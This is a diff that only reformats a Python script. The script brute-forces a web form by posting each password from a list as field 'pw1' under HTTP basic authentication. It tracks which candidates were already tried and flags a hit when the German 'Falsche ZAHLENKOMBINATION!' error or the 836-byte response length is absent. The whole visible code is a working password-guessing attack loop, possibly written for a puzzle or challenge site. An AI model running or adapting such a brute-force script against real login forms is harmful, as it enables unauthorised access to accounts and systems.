@@ -18,13 +18,15 @@ with open(already_tried_file, "r") as file:
 
 passwords_skipped = set(passwords).intersection(set(passwords_tried))
 
-print(f"Skipping {len(passwords_skipped)} out of {len(passwords)} passwords (already tried before).")
+print(
+    f"Skipping {len(passwords_skipped)} out of {len(passwords)} passwords (already tried before)."
+)
 
 passwords = set(passwords).difference(passwords_skipped)
 
 with open(already_tried_file, "a") as file:
     for password in passwords:
-        data = {'pw1' : password, "submit" : 'submit'}
+        data = {"pw1": password, "submit": "submit"}
         send_data_url = requests.post(url, data=data, auth=(page_user, page_psw))
 
         repeat_cnt = 0
@@ -35,10 +37,15 @@ with open(already_tried_file, "a") as file:
             send_data_url = requests.post(url, data=data, auth=(page_user, page_psw))
 
         if send_data_url.status_code != 200:
-            print(f"Status Code {send_data_url.status_code} - Wrong Credentials? - Stopping")
+            print(
+                f"Status Code {send_data_url.status_code} - Wrong Credentials? - Stopping"
+            )
             break
 
-        if "Falsche ZAHLENKOMBINATION!" in str(send_data_url.content) and len(send_data_url.content) == 836:
+        if (
+            "Falsche ZAHLENKOMBINATION!" in str(send_data_url.content)
+            and len(send_data_url.content) == 836
+        ):
             print(f"[*] Attempted password: {password}")
         else:
             print(f"[*] Password found: {password}")
